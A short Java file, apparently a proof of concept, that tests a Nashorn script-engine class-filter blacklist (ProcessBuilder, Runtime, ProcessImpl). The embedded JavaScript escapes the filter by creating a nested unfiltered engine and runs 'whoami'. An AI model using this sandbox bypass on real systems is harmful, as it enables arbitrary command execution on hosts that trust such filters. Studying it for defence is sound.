package js;

import groovy.lang.GroovyShell;
import jdk.nashorn.api.scripting.NashornScriptEngineFactory;
import org.python.google.common.collect.Sets;
import sun.misc.Unsafe;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.util.HashSet;
import java.util.Set;

public class Main {

    static Set<String> blackList = Sets.newHashSet("java.lang.ProcessBuilder", "java.lang.Runtime", "java.lang.ProcessImpl");
//    javax.script.ScriptEngineManager.
    public static void main(String[] args) throws ScriptException {
        //function verification(data){load("nashorn:mozilla_compat.js");importClass("java.lang.Runtime");var test=Java.type("java.lang.Runtime");
        String s = "function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\"js\").eval(\"new java.lang.ProcessBuilder('whoami').start().getInputStream();\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}";
        ScriptEngine engine;

        NashornScriptEngineFactory factory = new NashornScriptEngineFactory();
        engine = factory.getScriptEngine(clz -> !blackList.contains(clz));

        engine.eval(s);
    }

    public static void test(){
        ScriptEngineManager sc = new javax.script.ScriptEngineManager();
        sc.getEngineByExtension("js");
    }
}
